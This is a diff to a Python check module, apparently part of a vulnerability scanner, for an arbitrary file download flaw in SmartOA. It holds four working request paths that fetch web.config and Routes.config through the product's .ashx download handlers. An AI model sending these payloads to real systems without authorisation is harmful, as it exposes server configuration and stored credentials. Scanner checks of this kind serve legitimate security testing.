@@ -17,17 +17,20 @@ class smartoa_multi_filedownload_BaseVerify:
         self.url = url
 
     def run(self):
-        for payload in [r"/file/EmailDownload.ashx?url=~/web.config&name=web.config", r"/file/UDFDownLoad.ashx?path=~/web.config&name=web.config",
-                        r"/file/DownLoad.ashx?path=~/Routes.config", r"/file/MyDownLoad.ashx?path=~/Routes.config"]:
-            vulnurl = self.url + payload
-            try:
+        try:
+            noexist = True
+            for payload in [r"/file/EmailDownload.ashx?url=~/web.config&name=web.config", r"/file/UDFDownLoad.ashx?path=~/web.config&name=web.config",
+                            r"/file/DownLoad.ashx?path=~/Routes.config", r"/file/MyDownLoad.ashx?path=~/Routes.config"]:
+                vulnurl = self.url + payload
                 req = requests.get(vulnurl, timeout=10, verify=False)
-
                 if req.headers["Content-Type"] == "application/xml":
                     cprint("[+]存在smartoa任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在smartoa_multi_filedownload漏洞", "white", "on_grey")
 
-            except:
-                cprint("[-] "+__file__+"====>连接超时", "cyan")
+        except:
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
